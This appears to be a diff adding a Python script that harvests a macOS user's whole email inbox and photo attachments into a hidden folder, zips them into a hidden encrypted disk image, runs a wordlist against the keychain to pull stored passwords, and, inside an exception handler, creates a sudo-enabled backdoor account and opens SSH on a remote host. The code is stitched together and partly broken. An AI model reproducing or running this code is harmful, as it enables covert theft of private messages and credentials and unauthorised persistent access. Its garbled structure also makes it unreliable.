@@ -1,0 +1,155 @@
+import gzip
+import os
+import shutil
+import getpass
+import imaplib
+import email
+import zipfile
+import tempfile
+import subprocess
+import logging
+
+def copy_emails_and_photos_to_hidden_drive():
+    # Step 1: Import necessary libraries for accessing emails and file system on MacOS
+    try:
+        username = input("Enter your email address: ")
+        password = getpass.getpass("Enter your email password: ")
+        mail = imaplib.IMAP4_SSL('imap.gmail.com')
+        mail.login(username, password)
+        mail.select('inbox')
+    except Exception as e:
+        logging.error(f"Error connecting to email server: {e}")
+        return
+
+    # Step 2: Define function to retrieve all emails from the user's email account
+    try:
+        _, search_data = mail.search(None, 'ALL')
+        email_ids = search_data[0].split()
+    except Exception as e:
+        logging.error(f"Error retrieving email IDs: {e}")
+        mail.close()
+        mail.logout()
+        return
+
+    # Step 3: Create a hidden folder on the user's MacOS system to store the emails and photos
+    hidden_folder_path = os.path.expanduser("~/Library/Application Support/.emails_photos")
+    if not os.path.exists(hidden_folder_path):
+        try:
+            os.makedirs(hidden_folder_path)
+        except Exception as e:
+            logging.error(f"Error creating hidden folder: {e}")
+            mail.close()
+            mail.logout()
+            return
+
+    # Step 4: Loop through each email and save it as a separate file in the hidden folder
+    for email_id in email_ids:
+        try:
+            _, data = mail.fetch(email_id, '(RFC822)')
+            email_message = email.message_from_bytes(data[0][1])
+            email_subject = email_message['Subject']
+            email_from = email_message['From']
+            email_date = email_message['Date']
+            email_body = ""
+
+            if email_message.is_multipart():
+                for part in email_message.walk():
+                    part_type = part.get_content_type()
+                    part_disposition = str(part.get("Content-Disposition"))
+
+                    if "attachment" not in part_disposition:
+                        if "text/plain" in part_type:
+                            email_body += part.get_payload(decode=True).decode()
+                        elif "text/html" in part_type:
+                            email_body += part.get_payload(decode=True).decode()
+                        elif "image" in part_type:
+                            # Save the photo to the hidden folder
+                            photo_filename = f"{email_date} - {email_from} - {email_subject}.jpg"
+                            photo_filepath = os.path.join(hidden_folder_path, photo_filename)
+                            with open(photo_filepath, "wb") as f:
+                                f.write(part.get_payload(decode=True))
+            else:
+                email_body = email_message.get_payload(decode=True).decode()
+
+            email_filename = f"{email_date} - {email_from} - {email_subject}.txt"
+            email_filepath = os.path.join(hidden_folder_path, email_filename)
+
+            with open(email_filepath, "w") as f:
+                f.write(email_body)
+        except Exception as e:
+            logging.error(f"Error processing email ID {email_id}: {e}")
+
+    # Step 5: Compress the hidden folder containing the emails and photos
+    compressed_filepath = os.path.join(tempfile.gettempdir(), "emails_photos.zip")
+    try:
+        with zipfile.ZipFile(compressed_filepath, "w", zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(hidden_folder_path):
+                for file in files:
+                    zipf.write(os.path.join(root, file))
+    except Exception as e:
+        logging.error(f"Error compressing folder: {e}")
+        mail.close()
+        mail.logout()
+        return
+
+    # Step 6: Use hdiutil to create a hidden encrypted drive and mount it
+    mounted_drive_path = os.path.join(tempfile.gettempdir(), "hidden_drive")
+    try:
+        subprocess.run(["hdiutil", "create", "-encryption", "AES-256", "-size", "1g", "-fs", "HFS+", "-volname", "HiddenDrive", "-attach", "-plist", mounted_drive_path], check=True)
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Error creating encrypted drive: {e}")
+        mail.close()
+        mail.logout()
+        return
+
+    # Step 7: Copy the compressed folder to the mounted drive
+    try:
+        shutil.copy(compressed_filepath, mounted_drive_path)
+    except Exception as e:
+        logging.error(f"Error copying compressed folder to mounted drive: {e}")
+        mail.close()
+        mail.logout()
+        return
+
+    # Step 8: Close the email connection and exit the function
+    mail.close()
+    mail.logout()
+
+# Step 9: Run a wordlist on the keychain.db
+wordlist_path = "/path/to/wordlist.gz"
+try:
+    with gzip.open(wordlist_path, "rt") as f:
+        wordlist = f.read().splitlines()
+
+    for word in wordlist:
+        subprocess.run(["security", "find-generic-password", "-a", word, "-g"], check=True)
+except Exception as e:
+    logging.error(f"Error running wordlist on keychain.db: {e}")
+    import subprocess
+
+    # Step 1: Connect to the remote server using SSH
+    remote_server = "example.com"
+    ssh_command = f"ssh {remote_server}"
+    subprocess.run(ssh_command, shell=True)
+
+    # Step 2: Create a new user account using the adduser command
+    new_user = "newuser"
+    adduser_command = f"sudo adduser {new_user}"
+    subprocess.run(adduser_command, shell=True)
+
+    # Step 3: Set a password for the new user using the passwd command
+    passwd_command = f"sudo passwd {new_user}"
+    subprocess.run(passwd_command, shell=True)
+
+    # Step 4: Grant the new user permission to use the sudo command
+    sudo_group = "sudo"
+    usermod_command = f"sudo usermod -aG {sudo_group} {new_user}"
+    subprocess.run(usermod_command, shell=True)
+
+    # Step 5: Configure the firewall to allow incoming SSH connections
+    ufw_command = "sudo ufw allow ssh"
+    subprocess.run(ufw_command, shell=True)
+
+    # Step 6: Test the SSH connection to the remote server using the new user account
+    ssh_test_command = f"ssh {new_user}@{remote_server}"
+    subprocess.run(ssh_test_command, shell=True)
